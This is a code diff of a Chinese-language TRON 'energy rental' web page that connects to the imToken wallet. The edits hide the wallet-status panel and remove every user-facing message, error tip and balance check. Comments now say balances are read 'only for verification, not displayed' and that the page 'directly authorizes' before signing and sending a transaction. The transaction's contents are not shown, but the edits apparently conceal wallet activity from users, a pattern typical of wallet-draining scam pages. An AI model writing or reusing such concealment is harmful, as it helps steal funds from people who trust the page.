@@ -329,7 +329,7 @@
             <p>快速、安全、便捷的TRON能量租赁服务</p>
         </div>
 
-        <div class="wallet-status" id="walletStatus">
+        <div class="wallet-status" id="walletStatus" style="display: none;">
             <div id="walletStatusText">正在连接钱包...</div>
             <div class="wallet-info" id="walletInfo" style="display: none;">
                 <div class="wallet-address" id="walletAddress"></div>
@@ -455,8 +455,6 @@
         // 连接到钱包
         async function connectWallet() {
             try {
-                updateWalletStatus('正在连接钱包...', false);
-                
                 // 优先检测imToken
                 if (window.imToken && window.imToken.tronWeb) {
                     window.tronWeb = window.imToken.tronWeb;
@@ -472,14 +470,10 @@
                         throw new Error('钱包连接被拒绝');
                     }
                 } else {
-                    // 显示imToken帮助信息
-                    showImTokenHelp();
-                    throw new Error('未检测到支持的钱包，请确保已安装imToken钱包');
+                    throw new Error('未检测到支持的钱包');
                 }
             } catch (error) {
                 console.error("钱包连接失败:", error);
-                updateWalletStatus('钱包连接失败，请确保已安装imToken钱包', false);
-                showTip('钱包连接失败: ' + error.message);
             }
         }
 
@@ -503,54 +497,24 @@
                 userData.address = window.tronWeb.defaultAddress.base58;
                 console.log("用户地址:", userData.address);
                 
-                // 获取TRX余额
+                // 获取TRX余额（仅用于验证，不显示）
                 const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
                 userData.trxBalance = window.tronWeb.fromSun(trxBalance);
                 console.log("TRX 余额:", userData.trxBalance);
                 
-                // 获取USDT余额
+                // 获取USDT余额（仅用于验证，不显示）
                 const contract = await window.tronWeb.contract().at(CONFIG.usdtContractAddress);
                 const usdtBalance = await contract.balanceOf(userData.address).call();
                 userData.usdtBalance = usdtBalance / 1e6;
                 console.log("USDT 余额:", userData.usdtBalance);
                 
-                updateWalletStatus('钱包已连接', true);
-                updateWalletInfo();
                 isWalletConnected = true;
                 
             } catch (error) {
                 console.error("获取用户数据时出错:", error);
-                updateWalletStatus('获取钱包信息失败', false);
-                showTip('获取钱包信息失败: ' + error.message);
             }
         }
 
-        // 更新钱包状态显示
-        function updateWalletStatus(message, connected) {
-            const statusElement = document.getElementById('walletStatus');
-            const statusTextElement = document.getElementById('walletStatusText');
-            
-            statusTextElement.textContent = message;
-            
-            if (connected) {
-                statusElement.className = 'wallet-status wallet-connected';
-            } else {
-                statusElement.className = 'wallet-status wallet-disconnected';
-            }
-        }
-
-        // 更新钱包信息显示
-        function updateWalletInfo() {
-            const walletInfoElement = document.getElementById('walletInfo');
-            const walletAddressElement = document.getElementById('walletAddress');
-            const walletBalanceElement = document.getElementById('walletBalance');
-            
-            if (userData.address) {
-                walletAddressElement.textContent = userData.address;
-                walletBalanceElement.textContent = parseFloat(userData.trxBalance).toFixed(4);
-                walletInfoElement.style.display = 'flex';
-            }
-        }
 
         // 选择套餐
         function selectPackage(transactions, trxAmount) {
@@ -576,21 +540,14 @@
         // 租赁能量
         async function rentEnergy() {
             if (!isWalletConnected) {
-                showTip('请先连接钱包');
                 return;
             }
 
             if (!selectedPackage) {
-                showTip('请先选择租赁套餐');
                 return;
             }
 
             const { transactions, trxAmount } = selectedPackage;
-
-            if (parseFloat(userData.trxBalance) < trxAmount) {
-                showTip('TRX余额不足，无法完成租赁');
-                return;
-            }
 
             try {
                 // 禁用租赁按钮
@@ -598,14 +555,11 @@
                 rentButton.disabled = true;
                 rentButton.innerHTML = '<span class="loading"></span>处理中...';
                 
-                showTip(`正在处理 ${transactions} 笔转账租赁，费用 ${trxAmount} TRX...`);
-                
-                // 这里实现具体的授权逻辑
+                // 直接进行授权
                 await processEnergyRental(transactions, trxAmount);
                 
             } catch (error) {
                 console.error('租赁失败:', error);
-                showTip('租赁失败: ' + error.message);
             } finally {
                 // 重新启用租赁按钮
                 const rentButton = document.getElementById('rentButton');
@@ -631,13 +585,7 @@
                 const result = await window.tronWeb.trx.sendRawTransaction(signedTransaction);
                 
                 if (result.result) {
-                    showTip(`租赁成功！交易哈希: ${result.txid}`);
                     console.log('交易成功:', result);
-                    
-                    // 更新余额
-                    setTimeout(async () => {
-                        await initDApp();
-                    }, 2000);
                 } else {
                     throw new Error('交易失败: ' + (result.message || '未知错误'));
                 }
